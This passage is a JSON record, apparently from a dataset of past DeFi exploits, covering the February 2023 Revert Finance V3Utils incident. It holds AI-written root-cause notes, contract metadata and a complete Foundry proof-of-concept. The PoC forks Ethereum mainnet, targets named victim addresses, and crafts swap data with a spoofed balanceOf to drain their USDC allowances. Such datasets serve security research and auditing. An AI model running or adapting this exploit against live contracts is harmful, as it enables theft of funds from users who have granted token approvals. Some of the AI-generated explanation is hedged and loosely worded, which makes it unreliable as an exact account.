tacker iterates through multiple victims to maximize the stolen amount.", "ai_confidence_has_source_code": true, "ai_confidence_known_pattern_match": true, "ai_confidence_reasoning": "1 verified, 0 proxy", "ai_confidence_score": 0.75, "ai_confidence_verified_contracts": true, "ai_explanation": "The attacker exploits the `V3Utils.swap` function by providing `address(this)` as both `tokenIn` and `tokenOut`. The `swapData` parameter is crafted to call the `transferFrom` function within the attacker's contract. This `transferFrom` function increments a `counter`. The `V3Utils.swap` function likely checks the balance of `tokenIn` using a `balanceOf` call. By controlling the `counter` via the `transferFrom` call, the attacker can manipulate the return value of `balanceOf` in their own contract. Specifically, they can make `balanceOf` return 1 only when the `counter` is 1, which is the first time `transferFrom` is called. This allows them to trick the `V3Utils.swap` function into believing they have a small amount of `tokenIn` (1 unit), while in reality, they are draining the victim's USDC balance through the `transferFrom` call that is part of the `swapData` encoding.", "ai_mitigation": [], "ai_root_cause": "The `V3Utils.swap` function does not properly validate the `tokenIn` and `tokenOut` addresses and relies on a `balanceOf` check that can be manipulated by the attacker's contract due to the way `swapData` is constructed and the attacker's `transferFrom` and `balanceOf` implementations.", "ai_vulnerability_type": "Logic Error / Reentrancy (indirect)", "attack_title": "RevertFinance_exp", "contracts": [{"abi_available": true, "address": "0x531110418d8591c92e9cbbfc722db8ffb604fafd", "artifact_dir": "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.15+commit.e14f2714", "contract_name": "V3Utils", "explorer_url": "https://etherscan.io/address/0x531110418d8591c92e9cbbfc722db8ffb604fafd", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:34:48.771Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC20/extensions/draft-IERC20Permit.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC721/extensions/IERC721Enumerable.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/token/ERC721/extensions/IERC721Metadata.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/utils/Address.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/IERC721Permit.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/IPeripheryImmutableState.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/IPeripheryPayments.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/IPoolInitializer.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/interfaces/external/IWETH9.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/lib/v3-periphery/contracts/libraries/PoolAddress.sol", "data/contracts/2023_02_revertfinance/contracts/01_vulnerable_53111041_v3utils/sources/src/V3Utils.sol"], "source_hint": "AI extracted: The `V3Utils.swap` function is called with `tokenIn` and `tokenOut` set to `address(this)`. The `swapData` parameter is encoded with a `transferFrom` call to `victims[i]`, `address(this)`, and `transferAmount`. The `transferFrom` function in the `ContractTest` contract is designed to increment a `counter`. The `balanceOf` function in `ContractTest` returns 1 only when `counter` is 1. This logic allows the attacker to manipulate the `balanceOf` check within the `V3Utils.swap` function, potentially leading to an incorrect amount being transferred or processed.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2023_02_revertfinance", "id": "2023_02_revertfinance", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:34:54.544Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU
// @TX
// https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5

interface V3Utils {
    struct SwapParams {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient; // recipient of tokenOut and leftover tokenIn (if any leftover)
        bytes swapData;
        bool unwrap; // if tokenIn or tokenOut is WETH - unwrap
    }

    function swap(
        SwapParams calldata params
    ) external;
}

contract ContractTest is Test {
    V3Utils utils = V3Utils(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address[] victims = [0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, 0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2];
    uint256 counter;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_653_389);
        cheats.label(address(utils), "utils");
        cheats.label(address(USDC), "USDC");
    }

    function testExploit() external {
        for (uint256 i; i < victims.length; ++i) {
            uint256 transferAmount = USDC.balanceOf(victims[i]);
            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {
                transferAmount = USDC.allowance(victims[i], address(utils));
                if (transferAmount == 0) continue;
            }
            bytes memory data = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)", victims[i], address(this), transferAmount
            );
            bytes memory swapdata = abi.encode(address(USDC), address(this), data);
            V3Utils.SwapParams memory params = V3Utils.SwapParams({
                tokenIn: address(this),
                tokenOut: address(this),
                amountIn: 1,
                minAmountOut: 0,
                recipient: address(this),
                swapData: swapdata,
                unwrap: false
            });
            utils.swap(params);
            counter--;
        }

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        counter++;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        return true;
    }

    function balanceOf(
        address owner
    ) external view returns (uint256) {
        if (counter == 1) return 1;
        else return 0;
    }
}
